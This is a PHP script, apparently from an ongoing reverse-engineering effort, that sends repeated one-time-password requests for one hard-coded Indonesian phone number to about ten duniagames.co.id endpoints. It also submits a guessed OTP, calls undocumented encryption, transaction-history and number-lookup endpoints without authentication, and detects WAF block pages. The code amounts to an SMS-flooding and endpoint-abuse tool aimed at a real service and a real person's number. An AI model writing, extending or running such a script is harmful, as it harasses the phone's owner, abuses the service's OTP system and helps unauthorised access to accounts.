<?php
// Ronde 14: jalur OTP duniagames hasil RE chunk /profile + cek captcha Danacita
$UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36';
$L = '083822461998'; $N = '83822461998'; $P = '6283822461998';
$H = ['Accept: application/json, text/plain, */*', 'Content-Type: application/json',
     'Origin: https://duniagames.co.id', 'Referer: https://duniagames.co.id/'];

function req($m, $url, $body = '', $extra = []) {
  global $H, $UA;
  $ch = curl_init();
  curl_setopt_array($ch, [CURLOPT_URL => $url, CURLOPT_HTTPHEADER => array_merge($H, $extra, ['User-Agent: ' . $UA]),
    CURLOPT_RETURNTRANSFER => true, CURLOPT_CONNECTTIMEOUT => 10, CURLOPT_TIMEOUT => 30,
    CURLOPT_ENCODING => '', CURLOPT_CUSTOMREQUEST => $m]);
  if ($m !== 'GET' && $body !== '') curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
  $r = (string) curl_exec($ch); $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
  $err = curl_error($ch); curl_close($ch);
  $f = trim(preg_replace('/\s+/', ' ', $r));
  if (stripos($f, 'Just a moment') !== false || stripos($f, 'Attention Required') !== false) $f = 'WAF';
  elseif (preg_match('/<title>(.*?)<\/title>/is', $f, $mm)) $f = 'html title=' . trim($mm[1]);
  return sprintf("[%-3s] %s", $code ?: '000', $err !== '' ? 'GAGAL: ' . $err : ($f !== '' ? substr($f, 0, 175) : '(kosong)'));
}

$U = 'https://api.duniagames.co.id/api/user/api/';
$T = [
  ['GET', $U . 'v1/profile/send-otp-pin?phoneNumber=' . $L, '', []],
  ['GET', $U . 'v1/profile/send-otp-pin?phoneNumber=' . $P, '', []],
  ['GET', $U . 'v1/profile/send-otp-pin?phoneNumber=' . $N, '', []],
  ['POST', $U . 'v1/profile/validate-otp-pin', '{"phoneNumber":"' . $L . '","otpPin":"123456"}', []],
  ['POST', $U . 'v1/profile/encrypt-string', '{"string":"abc"}', []],
  ['POST', 'https://api.duniagames.co.id/api/transaction/v2/settlement/v2/req-otp', '{"phoneNumber":"' . $L . '"}',
    ['x-token: ' . $L]],
  ['POST', 'https://api.duniagames.co.id/api/transaction/v2/settlement/v1/req-otp', '{"phoneNumber":"' . $L . '"}', []],
  ['POST', 'https://api.duniagames.co.id/api/transaction/v2/top-up/payment-html5/req-otp', '{"phoneNumber":"' . $L . '"}', []],
  ['POST', 'https://api.duniagames.co.id/api/transaction/v1/top-up/payment-html5/req-otp', '{"phoneNumber":"' . $L . '"}', []],
  ['POST', 'https://api.duniagames.co.id/api/transaction/v1/top-up/history-phonenumber', '', []],
  ['GET', 'https://api.duniagames.co.id/api/transaction/v2/history-phonenumber', '', []],
  ['GET', 'https://api.duniagames.co.id/api/user/api/v1/get-msisdn?phoneNumber=' . $L, '', []],
];
foreach ($T as [$m, $u, $b, $e]) {
  printf("%-22s %s\n", basename(substr($u, 0, 90)), req($m, $u, $b, $e));
  usleep(350000);
}
echo "\n";
